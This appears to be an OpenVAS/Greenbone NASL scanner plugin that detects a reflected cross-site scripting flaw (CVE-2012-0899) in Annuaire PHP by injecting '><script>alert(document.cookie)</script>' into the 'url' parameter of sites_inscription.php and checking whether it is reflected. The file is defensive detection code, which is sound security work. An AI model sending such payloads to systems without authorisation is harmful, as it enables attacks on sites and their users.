if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902787" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_cve_id( "CVE-2012-0899" );
	script_bugtraq_id( 51434 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-01-24 18:49:12 +0530 (Tue, 24 Jan 2012)" );
	script_name( "Annuaire PHP 'sites_inscription.php' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/72407" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/108719/annuaire-xss.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow the attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of a vulnerable site." );
	script_tag( name: "affected", value: "Annuaire PHP" );
	script_tag( name: "insight", value: "The flaw is due to an input passed via the 'url' and 'nom'
  parameters to 'sites_inscription.php' page is not properly verified before it
  is returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Annuaire PHP and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
anPort = http_get_port( default: 80 );
if(!http_can_host_php( port: anPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/annuaire", "/Annuaire", http_cgi_dirs( port: anPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	anReq = http_get( item: NASLString( dir, "/admin/index.php" ), port: anPort );
	anRes = http_keepalive_send_recv( port: anPort, data: anReq );
	if(ContainsString( anRes, ">Annuaire" ) || ContainsString( anRes, "annuaire<" )){
		url = NASLString( dir + "/referencement/sites_inscription.php?nom=xss&url=" + "><script>alert(document.cookie)</script>" );
		if(http_vuln_check( port: anPort, url: url, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: make_list( "<title>Annuaire",
			 "compte_annu.php" ), check_header: TRUE )){
			security_message( port: anPort );
			exit( 0 );
		}
	}
}
exit( 99 );

